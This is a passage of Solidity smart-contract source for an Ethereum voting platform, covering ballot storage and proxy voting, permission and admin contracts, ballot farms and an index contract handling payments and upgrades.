proxyReq[3];\n bytes32 voteData = proxyReq[4];\n bytes memory signed = abi.encodePacked(proxyReq2, ballotId, voteData, extra);\n bytes32 msgHash = keccak256(signed);\n voter = ecrecover(msgHash, v, r, s);\n uint32 sequence = uint32(proxyReq2);\n _proxyReplayProtection(db, voter, sequence);\n if (submitAlways) {\n _addVoteAlways(db, voteData, voter, extra);\n } else {\n _addVote(db, voteData, voter, extra);\n }\n }\n function _addVote(DB storage db, bytes32 voteData, address sender, bytes extra) internal returns (uint256 id) {\n requireBallotOpen(db);\n return _addVoteAlways(db, voteData, sender, extra);\n }\n function _addVoteAlways(DB storage db, bytes32 voteData, address sender, bytes extra) internal returns (uint256 id) {\n id = db.nVotesCast;\n db.votes[id].voteData = voteData;\n db.votes[id].castTsAndSender = bytes32(sender) ^ bytes32(now << 160);\n if (extra.length > 0) {\n db.votes[id].extra = extra;\n }\n db.nVotesCast += 1;\n emit SuccessfulVote(sender, id);\n }\n function _proxyReplayProtection(DB storage db, address voter, uint32 sequence) internal {\n require(db.sequenceNumber[voter] < sequence, \"bad-sequence-n\");\n db.sequenceNumber[voter] = sequence;\n }\n function setEndTime(DB storage db, uint64 newEndTime) external {\n uint16 sb;\n uint64 sTs;\n (sb, sTs,) = BPackedUtils.unpackAll(db.packed);\n db.packed = BPackedUtils.pack(sb, sTs, newEndTime);\n }\n function revealSeckey(DB storage db, bytes32 sk) internal {\n db.ballotEncryptionSeckey = sk;\n emit SeckeyRevealed(sk);\n }\n uint16 constant SETTINGS_MASK = 0xFFFF ^ USE_TESTING ^ IS_OFFICIAL ^ IS_BINDING;\n function isEthNoEnc(uint16 submissionBits) pure internal returns (bool) {\n return checkFlags(submissionBits, USE_ETH | USE_NO_ENC);\n }\n function isEthWithEnc(uint16 submissionBits) pure internal returns (bool) {\n return checkFlags(submissionBits, USE_ETH | USE_ENC);\n }\n function isOfficial(uint16 submissionBits) pure internal returns (bool) {\n return (submissionBits & IS_OFFICIAL) == IS_OFFICIAL;\n }\n function isBinding(uint16 submissionBits) pure internal returns (bool) {\n return (submissionBits & IS_BINDING) == IS_BINDING;\n }\n function isTesting(uint16 submissionBits) pure internal returns (bool) {\n return (submissionBits & USE_TESTING) == USE_TESTING;\n }\n function qualifiesAsCommunityBallot(uint16 submissionBits) pure internal returns (bool) {\n return (submissionBits & (IS_BINDING | IS_OFFICIAL | USE_ENC)) == 0;\n }\n function checkFlags(uint16 submissionBits, uint16 expected) pure internal returns (bool) {\n uint16 sBitsNoSettings = submissionBits & SETTINGS_MASK;\n return sBitsNoSettings == expected;\n }\n}\nlibrary BPackedUtils {\n uint256 constant sbMask = 0xffffffffffffffffffffffffffff0000ffffffffffffffffffffffffffffffff;\n uint256 constant startTimeMask = 0xffffffffffffffffffffffffffffffff0000000000000000ffffffffffffffff;\n uint256 constant endTimeMask = 0xffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000;\n function packedToSubmissionBits(uint256 packed) internal pure returns (uint16) {\n return uint16(packed >> 128);\n }\n function packedToStartTime(uint256 packed) internal pure returns (uint64) {\n return uint64(packed >> 64);\n }\n function packedToEndTime(uint256 packed) internal pure returns (uint64) {\n return uint64(packed);\n }\n function unpackAll(uint256 packed) internal pure returns (uint16 submissionBits, uint64 startTime, uint64 endTime) {\n submissionBits = uint16(packed >> 128);\n startTime = uint64(packed >> 64);\n endTime = uint64(packed);\n }\n function pack(uint16 sb, uint64 st, uint64 et) internal pure returns (uint256 packed) {\n return uint256(sb) << 128 | uint256(st) << 64 | uint256(et);\n }\n function setSB(uint256 packed, uint16 newSB) internal pure returns (uint256) {\n return (packed & sbMask) | uint256(newSB) << 128;\n }\n function setEndTime(uint256 packed, uint64 endTime) internal pure returns (uint256) {\n return (packed & endTimeMask) | uint256(endTime);\n }\n}\ninterface CommAuctionIface {\n function getNextPrice(bytes32 democHash) external view returns (uint);\n function noteBallotDeployed(bytes32 democHash) external;\n function upgradeMe(address newSC) external;\n}\nlibrary IxLib {\n function getPayTo(IxIface ix) internal view returns (address) {\n return ix.getPayments().getPayTo();\n }\n function getBBFarmFromBallotID(IxIface ix, uint256 ballotId) internal view returns (BBFarmIface) {\n bytes4 bbNamespace = bytes4(ballotId >> 48);\n uint8 bbFarmId = ix.getBBFarmID(bbNamespace);\n return ix.getBBFarm(bbFarmId);\n }\n function getGDemocsN(IxIface ix) internal view returns (uint256) {\n return ix.getBackend().getGDemocsN();\n }\n function getGDemoc(IxIface ix, uint256 n) internal view returns (bytes32) {\n return ix.getBackend().getGDemoc(n);\n }\n function getGErc20ToDemocs(IxIface ix, address erc20) internal view returns (bytes32[] democHashes) {\n return ix.getBackend().getGErc20ToDemocs(erc20);\n }\n function accountInGoodStanding(IxIface ix, bytes32 democHash) internal view returns (bool) {\n return ix.getPayments().accountInGoodStanding(democHash);\n }\n function accountPremiumAndInGoodStanding(IxIface ix, bytes32 democHash) internal view returns (bool) {\n IxPaymentsIface payments = ix.getPayments();\n return payments.accountInGoodStanding(democHash) && payments.getPremiumStatus(democHash);\n }\n function payForDemocracy(IxIface ix, bytes32 democHash) internal {\n ix.getPayments().payForDemocracy.value(msg.value)(democHash);\n }\n function getDOwner(IxIface ix, bytes32 democHash) internal view returns (address) {\n return ix.getBackend().getDOwner(democHash);\n }\n function isDEditor(IxIface ix, bytes32 democHash, address editor) internal view returns (bool) {\n return ix.getBackend().isDEditor(democHash, editor);\n }\n function getDBallotsN(IxIface ix, bytes32 democHash) internal view returns (uint256) {\n return ix.getBackend().getDBallotsN(democHash);\n }\n function getDBallotID(IxIface ix, bytes32 democHash, uint256 n) internal view returns (uint256) {\n return ix.getBackend().getDBallotID(democHash, n);\n }\n function getDInfo(IxIface ix, bytes32 democHash) internal view returns (address erc20, address admin, uint256 _nBallots) {\n return ix.getBackend().getDInfo(democHash);\n }\n function getDErc20(IxIface ix, bytes32 democHash) internal view returns (address erc20) {\n return ix.getBackend().getDErc20(democHash);\n }\n function getDHash(IxIface ix, bytes13 prefix) internal view returns (bytes32) {\n return ix.getBackend().getDHash(prefix);\n }\n function getDCategoriesN(IxIface ix, bytes32 democHash) internal view returns (uint) {\n return ix.getBackend().getDCategoriesN(democHash);\n }\n function getDCategory(IxIface ix, bytes32 democHash, uint categoryId) internal view returns (bool, bytes32, bool, uint) {\n return ix.getBackend().getDCategory(democHash, categoryId);\n }\n function getDArbitraryData(IxIface ix, bytes32 democHash, bytes key) external view returns (bytes) {\n return ix.getBackend().getDArbitraryData(democHash, key);\n }\n}\ncontract SVBallotConsts {\n uint16 constant USE_ETH = 1;\n uint16 constant USE_SIGNED = 2;\n uint16 constant USE_NO_ENC = 4;\n uint16 constant USE_ENC = 8;\n uint16 constant IS_BINDING = 8192;\n uint16 constant IS_OFFICIAL = 16384;\n uint16 constant USE_TESTING = 32768;\n}\ncontract safeSend {\n bool private txMutex3847834;\n function doSafeSend(address toAddr, uint amount) internal {\n doSafeSendWData(toAddr, \"\", amount);\n }\n function doSafeSendWData(address toAddr, bytes data, uint amount) internal {\n require(txMutex3847834 == false, \"ss-guard\");\n txMutex3847834 = true;\n require(toAddr.call.value(amount)(data), \"ss-failed\");\n txMutex3847834 = false;\n }\n}\ncontract payoutAllC is safeSend {\n address private _payTo;\n event PayoutAll(address payTo, uint value);\n constructor(address initPayTo) public {\n assert(initPayTo != address(0));\n _payTo = initPayTo;\n }\n function _getPayTo() internal view returns (address) {\n return _payTo;\n }\n function _setPayTo(address newPayTo) internal {\n _payTo = newPayTo;\n }\n function payoutAll() external {\n address a = _getPayTo();\n uint bal = address(this).balance;\n doSafeSend(a, bal);\n emit PayoutAll(a, bal);\n }\n}\ncontract payoutAllCSettable is payoutAllC {\n constructor (address initPayTo) payoutAllC(initPayTo) public {\n }\n function setPayTo(address) external;\n function getPayTo() external view returns (address) {\n return _getPayTo();\n }\n}\ncontract owned {\n address public owner;\n event OwnerChanged(address newOwner);\n modifier only_owner() {\n require(msg.sender == owner, \"only_owner: forbidden\");\n _;\n }\n modifier owner_or(address addr) {\n require(msg.sender == addr || msg.sender == owner, \"!owner-or\");\n _;\n }\n constructor() public {\n owner = msg.sender;\n }\n function setOwner(address newOwner) only_owner() external {\n owner = newOwner;\n emit OwnerChanged(newOwner);\n }\n}\ncontract CanReclaimToken is owned {\n function reclaimToken(ERC20Interface token) external only_owner {\n uint256 balance = token.balanceOf(this);\n require(token.approve(owner, balance));\n }\n}\ncontract CommunityAuctionSimple is owned, CommAuctionIface {\n uint public commBallotPriceWei = 1666666666000000;\n struct Record {\n bytes32 democHash;\n uint ts;\n }\n mapping (address => Record[]) public ballotLog;\n mapping (address => address) public upgrades;\n function getNextPrice(bytes32) external view returns (uint) {\n return commBallotPriceWei;\n }\n function noteBallotDeployed(bytes32 d) external {\n require(upgrades[msg.sender] == address(0));\n ballotLog[msg.sender].push(Record(d, now));\n }\n function upgradeMe(address newSC) external {\n require(upgrades[msg.sender] == address(0));\n upgrades[msg.sender] = newSC;\n }\n function getBallotLogN(address a) external view returns (uint) {\n return ballotLog[a].length;\n }\n function setPriceWei(uint newPrice) only_owner() external {\n commBallotPriceWei = newPrice;\n }\n}\ncontract controlledIface {\n function controller() external view returns (address);\n}\ncontract hasAdmins is owned {\n mapping (uint => mapping (address => bool)) admins;\n uint public currAdminEpoch = 0;\n bool public adminsDisabledForever = false;\n address[] adminLog;\n event AdminAdded(address indexed newAdmin);\n event AdminRemoved(address indexed oldAdmin);\n event AdminEpochInc();\n event AdminDisabledForever();\n modifier only_admin() {\n require(adminsDisabledForever == false, \"admins must not be disabled\");\n require(isAdmin(msg.sender), \"only_admin: forbidden\");\n _;\n }\n constructor() public {\n _setAdmin(msg.sender, true);\n }\n function isAdmin(address a) view public returns (bool) {\n return admins[currAdminEpoch][a];\n }\n function getAdminLogN() view external returns (uint) {\n return adminLog.length;\n }\n function getAdminLog(uint n) view external returns (address) {\n return adminLog[n];\n }\n function upgradeMeAdmin(address newAdmin) only_admin() external {\n require(msg.sender != owner, \"owner cannot upgrade self\");\n _setAdmin(msg.sender, false);\n _setAdmin(newAdmin, true);\n }\n function setAdmin(address a, bool _givePerms) only_admin() external {\n require(a != msg.sender && a != owner, \"cannot change your own (or owner's) permissions\");\n _setAdmin(a, _givePerms);\n }\n function _setAdmin(address a, bool _givePerms) internal {\n admins[currAdminEpoch][a] = _givePerms;\n if (_givePerms) {\n emit AdminAdded(a);\n adminLog.push(a);\n } else {\n emit AdminRemoved(a);\n }\n }\n function incAdminEpoch() only_owner() external {\n currAdminEpoch++;\n admins[currAdminEpoch][msg.sender] = true;\n emit AdminEpochInc();\n }\n function disableAdminForever() internal {\n currAdminEpoch++;\n adminsDisabledForever = true;\n emit AdminDisabledForever();\n }\n}\ncontract EnsOwnerProxy is hasAdmins {\n bytes32 public ensNode;\n ENSIface public ens;\n PublicResolver public resolver;\n constructor(bytes32 _ensNode, ENSIface _ens, PublicResolver _resolver) public {\n ensNode = _ensNode;\n ens = _ens;\n resolver = _resolver;\n }\n function setAddr(address addr) only_admin() external {\n _setAddr(addr);\n }\n function _setAddr(address addr) internal {\n resolver.setAddr(ensNode, addr);\n }\n function returnToOwner() only_owner() external {\n ens.setOwner(ensNode, owner);\n }\n function fwdToENS(bytes data) only_owner() external {\n require(address(ens).call(data), \"fwding to ens failed\");\n }\n function fwdToResolver(bytes data) only_owner() external {\n require(address(resolver).call(data), \"fwding to resolver failed\");\n }\n}\ncontract permissioned is owned, hasAdmins {\n mapping (address => bool) editAllowed;\n bool public adminLockdown = false;\n event PermissionError(address editAddr);\n event PermissionGranted(address editAddr);\n event PermissionRevoked(address editAddr);\n event PermissionsUpgraded(address oldSC, address newSC);\n event SelfUpgrade(address oldSC, address newSC);\n event AdminLockdown();\n modifier only_editors() {\n require(editAllowed[msg.sender], \"only_editors: forbidden\");\n _;\n }\n modifier no_lockdown() {\n require(adminLockdown == false, \"no_lockdown: check failed\");\n _;\n }\n constructor() owned() hasAdmins() public {\n }\n function setPermissions(address e, bool _editPerms) no_lockdown() only_admin() external {\n editAllowed[e] = _editPerms;\n if (_editPerms)\n emit PermissionGranted(e);\n else\n emit PermissionRevoked(e);\n }\n function upgradePermissionedSC(address oldSC, address newSC) no_lockdown() only_admin() external {\n editAllowed[oldSC] = false;\n editAllowed[newSC] = true;\n emit PermissionsUpgraded(oldSC, newSC);\n }\n function upgradeMe(address newSC) only_editors() external {\n editAllowed[msg.sender] = false;\n editAllowed[newSC] = true;\n emit SelfUpgrade(msg.sender, newSC);\n }\n function hasPermissions(address a) public view returns (bool) {\n return editAllowed[a];\n }\n function doLockdown() external only_owner() no_lockdown() {\n disableAdminForever();\n adminLockdown = true;\n emit AdminLockdown();\n }\n}\ncontract upgradePtr {\n address ptr = address(0);\n modifier not_upgraded() {\n require(ptr == address(0), \"upgrade pointer is non-zero\");\n _;\n }\n function getUpgradePointer() view external returns (address) {\n return ptr;\n }\n function doUpgradeInternal(address nextSC) internal {\n ptr = nextSC;\n }\n}\ninterface ERC20Interface {\n function totalSupply() constant external returns (uint256 _totalSupply);\n function balanceOf(address _owner) constant external returns (uint256 balance);\n function transfer(address _to, uint256 _value) external returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);\n function approve(address _spender, uint256 _value) external returns (bool success);\n function allowance(address _owner, address _spender) constant external returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract ixEvents {\n event PaymentMade(uint[2] valAndRemainder);\n event AddedBBFarm(uint8 bbFarmId);\n event SetBackend(bytes32 setWhat, address newSC);\n event DeprecatedBBFarm(uint8 bbFarmId);\n event CommunityBallot(bytes32 democHash, uint256 ballotId);\n event ManuallyAddedBallot(bytes32 democHash, uint256 ballotId, uint256 packed);\n event BallotCreatedWithID(uint ballotId);\n event BBFarmInit(bytes4 namespace);\n}\ncontract ixBackendEvents {\n event NewDemoc(bytes32 democHash);\n event ManuallyAddedDemoc(bytes32 democHash, address erc20);\n event NewBallot(bytes32 indexed democHash, uint ballotN);\n event DemocOwnerSet(bytes32 indexed democHash, address owner);\n event DemocEditorSet(bytes32 indexed democHash, address editor, bool canEdit);\n event DemocEditorsWiped(bytes32 indexed democHash);\n event DemocErc20Set(bytes32 indexed democHash, address erc20);\n event DemocDataSet(bytes32 indexed democHash, bytes32 keyHash);\n event DemocCatAdded(bytes32 indexed democHash, uint catId);\n event DemocCatDeprecated(bytes32 indexed democHash, uint catId);\n event DemocCommunityBallotsEnabled(bytes32 indexed democHash, bool enabled);\n event DemocErc20OwnerClaimDisabled(bytes32 indexed democHash);\n event DemocClaimed(bytes32 indexed democHash);\n event EmergencyDemocOwner(bytes32 indexed democHash, address newOwner);\n}\nlibrary SafeMath {\n function subToZero(uint a, uint b) internal pure returns (uint) {\n if (a < b) {\n return 0;\n }\n return a - b;\n }\n}\ncontract ixPaymentEvents {\n event UpgradedToPremium(bytes32 indexed democHash);\n event GrantedAccountTime(bytes32 indexed democHash, uint additionalSeconds, bytes32 ref);\n event AccountPayment(bytes32 indexed democHash, uint additionalSeconds);\n event SetCommunityBallotFee(uint amount);\n event SetBasicCentsPricePer30Days(uint amount);\n event SetPremiumMultiplier(uint8 multiplier);\n event DowngradeToBasic(bytes32 indexed democHash);\n event UpgradeToPremium(bytes32 indexed democHash);\n event SetExchangeRate(uint weiPerCent);\n event FreeExtension(bytes32 democHash);\n event SetBallotsPer30Days(uint amount);\n event SetFreeExtension(bytes32 democHash, bool hasFreeExt);\n event SetDenyPremium(bytes32 democHash, bool isPremiumDenied);\n event SetPayTo(address payTo);\n event SetMinorEditsAddr(address minorEditsAddr);\n event SetMinWeiForDInit(uint amount);\n}\ninterface hasVersion {\n function getVersion() external pure returns (uint);\n}\ncontract BBFarmIface is BBFarmEvents, permissioned, hasVersion, payoutAllC {\n function getNamespace() external view returns (bytes4);\n function getBBLibVersion() external view returns (uint256);\n function getNBallots() external view returns (uint256);\n function getVotingNetworkDetails() external view returns (bytes32);\n function initBallot( bytes32 specHash\n , uint256 packed\n , IxIface ix\n , address bbAdmin\n , bytes24 extraData\n ) external returns (uint ballotId);\n function initBallotProxy(uint8 v, bytes32 r, bytes32 s, bytes32[4] params) external returns (uint256 ballotId);\n function sponsor(uint ballotId) external payable;\n function submitVote(uint ballotId, bytes32 vote, bytes extra) external;\n function submitProxyVote(bytes32[5] proxyReq, bytes extra) external;\n function getDetails(uint ballotId, address voter) external view returns\n ( bool hasVoted\n , uint nVotesCast\n , bytes32 secKey\n , uint16 submissionBits\n , uint64 startTime\n , uint64 endTime\n , bytes32 specHash\n , bool deprecated\n , address ballotOwner\n , bytes16 extraData);\n function getVote(uint ballotId, uint voteId) external view returns (bytes32 voteData, address sender, bytes extra);\n function getVoteAndTime(uint ballotId, uint voteId) external view returns (bytes32 voteData, address sender, bytes extra, uint castTs);\n function getTotalSponsorship(uint ballotId) external view returns (uint);\n function getSponsorsN(uint ballotId) external view returns (uint);\n function getSponsor(uint ballotId, uint sponsorN) external view returns (address sender, uint amount);\n function getCreationTs(uint ballotId) external view returns (uint);\n function revealSeckey(uint ballotId, bytes32 sk) external;\n function setEndTime(uint ballotId, uint64 newEndTime) external;\n function setDeprecated(uint ballotId) external;\n function setBallotOwner(uint ballotId, address newOwner) external;\n}\ncontract BBFarm is BBFarmIface {\n using BBLibV7 for BBLibV7.DB;\n using IxLib for IxIface;\n bytes4 constant NAMESPACE = 0x00000001;\n uint256 constant BALLOT_ID_MASK = 0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;\n uint constant VERSION = 3;\n mapping (uint224 => BBLibV7.DB) dbs;\n uint nBallots = 0;\n modifier req_namespace(uint ballotId) {\n require(bytes4(ballotId >> 224) == NAMESPACE, \"bad-namespace\");\n _;\n }\n constructor() payoutAllC(msg.sender) public {\n assert(BBLibV7.getVersion() == 7);\n emit BBFarmInit(NAMESPACE);\n }\n function _getPayTo() internal view returns (address) {\n return owner;\n }\n function getVersion() external pure returns (uint) {\n return VERSION;\n }\n function getNamespace() external view returns (bytes4) {\n return NAMESPACE;\n }\n function getBBLibVersion() external view returns (uint256) {\n return BBLibV7.getVersion();\n }\n function getNBallots() external view returns (uint256) {\n return nBallots;\n }\n function getVotingNetworkDetails() external view returns (bytes32) {\n return bytes32(uint(0) << 192 | uint(0) << 160 | uint160(address(this)));\n }\n function getDb(uint ballotId) internal view returns (BBLibV7.DB storage) {\n return dbs[uint224(ballotId)];\n }\n function initBallot( bytes32 specHash\n , uint256 packed\n , IxIface ix\n , address bbAdmin\n , bytes24 extraData\n ) only_editors() external returns (uint ballotId) {\n ballotId = uint224(specHash) ^ (uint256(NAMESPACE) << 224);\n getDb(ballotId).init(specHash, packed, ix, bbAdmin, bytes16(uint128(extraData)));\n nBallots += 1;\n emit BallotCreatedWithID(ballotId);\n }\n function initBallotProxy(uint8, bytes32, bytes32, bytes32[4]) external returns (uint256) {\n revert(\"initBallotProxy not implemented\");\n }\n function sponsor(uint ballotId) external payable {\n BBLibV7.DB storage db = getDb(ballotId);\n db.logSponsorship(msg.value);\n doSafeSend(db.index.getPayTo(), msg.value);\n emit Sponsorship(ballotId, msg.value);\n }\n function submitVote(uint ballotId, bytes32 vote, bytes extra) req_namespace(ballotId) external {\n getDb(ballotId).submitVote(vote, extra);\n emit Vote(ballotId, vote, msg.sender, extra);\n }\n function submitProxyVote(bytes32[5] proxyReq, bytes extra) req_namespace(uint256(proxyReq[3])) external {\n uint ballotId = uint256(proxyReq[3]);\n address voter = getDb(ballotId).submitProxyVote(proxyReq, extra);\n bytes32 vote = proxyReq[4];\n emit Vote(ballotId, vote, voter, extra);\n }\n function getDetails(uint ballotId, address voter) external view returns\n ( bool hasVoted\n , uint nVotesCast\n , bytes32 secKey\n , uint16 submissionBits\n , uint64 startTime\n , uint64 endTime\n , bytes32 specHash\n , bool deprecated\n , address ballotOwner\n , bytes16 extraData) {\n BBLibV7.DB storage db = getDb(ballotId);\n uint packed = db.packed;\n return (\n db.getSequenceNumber(voter) > 0,\n db.nVotesCast,\n db.ballotEncryptionSeckey,\n BPackedUtils.packedToSubmissionBits(packed),\n BPackedUtils.packedToStartTime(packed),\n BPackedUtils.packedToEndTime(packed),\n db.specHash,\n db.deprecated,\n db.ballotOwner,\n db.extraData\n );\n }\n function getVote(uint ballotId, uint voteId) external view returns (bytes32 voteData, address sender, bytes extra) {\n (voteData, sender, extra, ) = getDb(ballotId).getVote(voteId);\n }\n function getVoteAndTime(uint ballotId, uint voteId) external view returns (bytes32 voteData, address sender, bytes extra, uint castTs) {\n return getDb(ballotId).getVote(voteId);\n }\n function getSequenceNumber(uint ballotId, address voter) external view returns (uint32 sequence) {\n return getDb(ballotId).getSequenceNumber(voter);\n }\n function getTotalSponsorship(uint ballotId) external view returns (uint) {\n return getDb(ballotId).getTotalSponsorship();\n }\n function getSponsorsN(uint ballotId) external view returns (uint) {\n return getDb(ballotId).sponsors.length;\n }\n function getSponsor(uint ballotId, uint sponsorN) external view returns (address sender, uint amount) {\n return getDb(ballotId).getSponsor(sponsorN);\n }\n function getCreationTs(uint ballotId) external view returns (uint) {\n return getDb(ballotId).creationTs;\n }\n function revealSeckey(uint ballotId, bytes32 sk) external {\n BBLibV7.DB storage db = getDb(ballotId);\n db.requireBallotOwner();\n db.requireBallotClosed();\n db.revealSeckey(sk);\n }\n function setEndTime(uint ballotId, uint64 newEndTime) external {\n BBLibV7.DB storage db = getDb(ballotId);\n db.requireBallotOwner();\n db.requireTesting();\n db.setEndTime(newEndTime);\n }\n function setDeprecated(uint ballotId) external {\n BBLibV7.DB storage db = getDb(ballotId);\n db.requireBallotOwner();\n db.deprecated = true;\n }\n function setBallotOwner(uint ballotId, address newOwner) external {\n BBLibV7.DB storage db = getDb(ballotId);\n db.requireBallotOwner();\n db.ballotOwner = newOwner;\n }\n}\ncontract IxIface is hasVersion,\n ixPaymentEvents,\n ixBackendEvents,\n ixEvents,\n SVBallotConsts,\n owned,\n CanReclaimToken,\n upgradePtr,\n payoutAllC {\n function addBBFarm(BBFarmIface bbFarm) external returns (uint8 bbFarmId);\n function setABackend(bytes32 toSet, address newSC) external;\n function deprecateBBFarm(uint8 bbFarmId, BBFarmIface _bbFarm) external;\n function getPayments() external view returns (IxPaymentsIface);\n function getBackend() external view returns (IxBackendIface);\n function getBBFarm(uint8 bbFarmId) external view returns (BBFarmIface);\n function getBBFarmID(bytes4 bbNamespace) external view returns (uint8 bbFarmId);\n function getCommAuction() external view returns (CommAuctionIface);\n function dInit(address defualtErc20, bool disableErc20OwnerClaim) external payable returns (bytes32);\n function setDEditor(bytes32 democHash, address editor, bool canEdit) external;\n function setDNoEditors(bytes32 democHash) external;\n function setDOwner(bytes32 democHash, address newOwner) external;\n function dOwnerErc20Claim(bytes32 democHash) external;\n function setDErc20(bytes32 democHash, address newErc20) external;\n function dAddCategory(bytes32 democHash, bytes32 categoryName, bool hasParent, uint parent) external;\n function dDeprecateCategory(bytes32 democHash, uint categoryId) external;\n function dUpgradeToPremium(bytes32 democHash) external;\n function dDowngradeToBasic(bytes32 democHash) external;\n function dSetArbitraryData(bytes32 democHash, bytes key, bytes value) external;\n function dSetCommunityBallotsEnabled(bytes32 democHash, bool enabled) external;\n function dDisableErc20OwnerClaim(bytes32 democHash) external;\n function dAddBallot(bytes32 democHash, uint ballotId, uint256 packed) external;\n function dDeployCommunityBallot(bytes32 democHash, bytes32 specHash, bytes32 extraData, uint128 packedTimes) external payable;\n function dDeployBallot(bytes32 democHash, bytes32 specHash, bytes32 extraData, uint256 packed) external payable;\n}\ncontract SVIndex is IxIface {\n uint256 constant VERSION = 2;\n bytes4 constant OWNER_SIG = 0x8da5cb5b;\n bytes4 constant CONTROLLER_SIG = 0xf77c4791;\n IxBackendIface backend;\n IxPaymentsIface payments;\n EnsOwnerProxy public ensOwnerPx;\n BBFarmIface[] bbFarms;\n CommAuctionIface commAuction;\n mapping (bytes4 => uint8) bbFarmIdLookup;\n mapping (uint8 => bool) deprecatedBBFarms;\n modifier onlyDemocOwner(bytes32 democHash) {\n require(msg.sender == backend.getDOwner(democHash), \"!d-owner\");\n _;\n }\n modifier onlyDemocEditor(bytes32 democHash) {\n require(backend.isDEditor(democHash, msg.sender), \"!d-editor\");\n _;\n }\n constructor( IxBackendIface _b\n , IxPaymentsIface _pay\n , EnsOwnerProxy _ensOwnerPx\n , BBFarmIface _bbFarm0\n , CommAuctionIface _commAuction\n ) payoutAllC(msg.sender) public {\n backend = _b;\n payments = _pay;\n ensOwnerPx = _ensOwnerPx;\n _addBBFarm(0x0, _bbFarm0);\n commAuction = _commAuction;\n }\n function _getPayTo() internal view returns (address) {\n return payments.getPayTo();\n }\n function doUpgrade(address nextSC) only_owner() not_upgraded() external {\n doUpgradeInternal(nextSC);\n backend.upgradeMe(nextSC);\n payments.upgradeMe(nextSC);\n ensOwnerPx.setAddr(nextSC);\n ensOwnerPx.upgradeMeAdmin(nextSC);\n commAuction.upgradeMe(nextSC);\n for (uint i = 0; i < bbFarms.length; i++) {\n bbFarms[i].upgradeMe(nextSC);\n }\n }\n function _addBBFarm(bytes4 bbNamespace, BBFarmIface _bbFarm) internal returns (uint8 bbFarmId) {\n uint256 bbFarmIdLong = bbFarms.length;\n require(bbFarmIdLong < 2**8, \"too-many-farms\");\n bbFarmId = uint8(bbFarmIdLong);\n bbFarms.push(_bbFarm);\n bbFarmIdLookup[bbNamespace] = bbFarmId;\n emit AddedBBFarm(bbFarmId);\n }\n function addBBFarm(BBFarmIface bbFarm) only_owner() external returns (uint8 bbFarmId) {\n bytes4 bbNamespace = bbFarm.getNamespace();\n require(bbNamespace != bytes4(0), \"bb-farm-namespace\");\n require(bbFarmIdLookup[bbNamespace] == 0 && bbNamespace != bbFarms[0].getNamespace(), \"bb-namespace-used\");\n bbFarmId = _addBBFarm(bbNamespace, bbFarm);\n }\n function setABackend(bytes32 toSet, address newSC) only_owner() external {\n emit SetBackend(toSet, newSC);\n if (toSet == bytes32(\"payments\")) {\n payments = IxPaymentsIface(newSC);\n } else if (toSet == bytes32(\"backend\")) {\n backend = IxBackendIface(newSC);\n } else if (toSet == bytes32(\"commAuction\")) {\n commAuction = CommAuctionIface(newSC);\n } else {\n revert(\"404\");\n }\n }\n function deprecateBBFarm(uint8 bbFarmId, BBFarmIface _bbFarm) only_owner() external {\n require(address(_bbFarm) != address(0));\n require(bbFarms[bbFarmId] == _bbFarm);\n deprecatedBBFarms[bbFarmId] = true;\n emit DeprecatedBBFarm(bbFarmId);\n }\n function getPayments() external view returns (IxPaymentsIface) {\n return payments;\n }\n function getBackend() external view returns (IxBackendIface) {\n return backend;\n }\n function getBBFarm(uint8 bbFarmId) external view returns (BBFarmIface) {\n return bbFarms[bbFarmId];\n }\n function getBBFarmID(bytes4 bbNamespace) external view returns (uint8 bbFarmId) {\n return bbFarmIdLookup[bbNamespace];\n }\n function getCommAuction() external view returns (CommAuctionIface) {\n return commAuction;\n }\n function getVersion() external pure returns (uint256) {\n return VERSION;\n }\n function dInit(address defaultErc20, bool disableErc20OwnerClaim) not_upgraded() external payable returns (bytes32) {\n require(msg.value >= payments.getMinWeiForDInit());\n bytes32 democHash = backend.dInit(defaultErc20, msg.sender, disableErc20OwnerClaim);\n payments.payForDemocracy.value(msg.value)(democHash);\n return democHash;\n }\n function setDEditor(bytes32 democHash, address editor, bool canEdit) onlyDemocOwner(democHash) external {\n backend.setDEditor(democHash, editor, canEdit);\n }\n function setDNoEditors(bytes32 democHash) onlyDemocOwner(democHash) external {\n backend.setDNoEditors(democHash);\n }\n function setDOwner(bytes32 democHash, address newOwner) onlyDemocOwner(democHash) external {\n backend.setDOwner(democHash, newOwner);\n }\n function dOwnerErc20Claim(bytes32 democHash) external {\n address erc20 = backend.getDErc20(democHash);\n if (erc20.call.gas(3000)(OWNER_SIG)) {\n require(msg.sender == owned(erc20).owner.gas(3000)(), \"!erc20-owner\");\n } else if (erc20.call.gas(3000)(CONTROLLER_SIG)) {\n require(msg.sender == controlledIface(erc20).controller.gas(3000)(), \"!erc20-controller\");\n } else {\n revert();\n }\n backend.setDOwnerFromClaim(democHash, msg.sender);\n }\n function setDErc20(bytes32 democHash, address newErc20) onlyDemocOwner(democHash) external {\n backend.setDErc20(democHash, newErc20);\n }\n function dAddCategory(bytes32 democHash, bytes32 catName, bool hasParent, uint parent) onlyDemocEditor(democHash) external {\n backend.dAddCategory(democHash, catName, hasParent, parent);\n }\n function dDeprecateCategory(bytes32 democHash, uint catId) onlyDemocEditor(democHash) external {\n backend.dDeprecateCategory(democHash, catId);\n }\n function dUpgradeToPremium(bytes32 democHash) onlyDemocOwner(democHash) external {\n payments.upgradeToPremium(democHash);\n }\n function dDowngradeToBasic(bytes32 democHash) onlyDemocOwner(democHash) external {\n payments.downgradeToBasic(democHash);\n }\n function dSetArbitraryData(bytes32 democHash, bytes key, bytes value) external {\n if (msg.sender == backend.getDOwner(democHash)) {\n backend.dSetArbitraryData(democHash, key, value);\n } else if (backend.isDEditor(democHash, msg.sender)) {\n backend.dSetEditorArbitraryData(democHash, key, value);\n } else {\n revert();\n }\n }\n function dSetCommunityBallotsEnabled(bytes32 democHash, bool enabled) onlyDemocOwner(democHash) external {\n backend.dSetCommunityBallotsEnabled(democHash, enabled);\n }\n function dDisableErc20OwnerClaim(bytes32 democHash) onlyDemocOwner(democHash) external {\n backend.dDisableErc20OwnerClaim(democHash);\n }\n function dAddBallot(bytes32 democHash, uint ballotId, uint256 packed)\n only_owner()\n external {\n _addBallot(democHash, ballotId, packed, false);\n emit ManuallyAddedBallot(democHash, ballotId, packed);\n }\n function _deployBallot(bytes32 